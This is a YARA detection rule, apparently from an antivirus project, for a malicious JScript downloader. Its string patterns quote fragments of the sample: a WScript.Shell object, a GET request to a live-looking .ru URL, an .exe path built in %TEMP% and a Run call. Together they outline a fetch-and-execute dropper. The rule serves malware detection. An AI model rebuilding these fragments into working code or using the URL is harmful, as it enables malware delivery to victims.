rule sig_20160330_c49f2c627a645301ed849c6ae0824aa6 {
  meta:
    description = "datamaliciousorder - file 20160330_c49f2c627a645301ed849c6ae0824aa6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9da051023e5212a325179346effeb21008bb8d934849ae9affb7e1424a0cc4e5"

  strings:
    $s1  = "var UB = function K0() {return WScript[MF](\"WScript\"+\".Shell\");}(), LS = 11;" fullword ascii
    $s2  = "RS[S](\"GET\", \"http://zakaz-sharikov.ru/x9dslp\", false);" fullword ascii
    $s3  = "function T(CF, B0){LB = LB * 1; return CF - B0;};" fullword ascii
    $s4  = "if (RS[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function E() {return UB[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"YnajiSnTYQH2Bh.ex\" + \"e\";};" fullword ascii
    $s6  = "function N(){return A + \"\";};" fullword ascii
    $s7  = "function WM(Q){UB[\"Run\"](Q, LB, LB);};" fullword ascii
    $s8  = "function C() {return ((M == true) && (M == SM)) ? 1 : LB;};" fullword ascii
    $s9  = "function F()" fullword ascii
    $s10 = "function G(){return 22;};" fullword ascii
    $s11 = "}while (W);" fullword ascii
    $s12 = "var MD = new this[\"Date\"]();" fullword ascii
    $s13 = "function Y(){return MF;};" fullword ascii
    $s14 = "function K(C0) {var F0 = (1, 2, 3, 4, 5, C0); return F0;};" fullword ascii
    $s15 = "return T(V, LO);" fullword ascii
    $s16 = "M = true; " fullword ascii
    $s17 = "SM = true; " fullword ascii
    $s18 = "var SM = false;" fullword ascii
    $s19 = "var VS = false;" fullword ascii
    $s20 = "} catch(NC){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}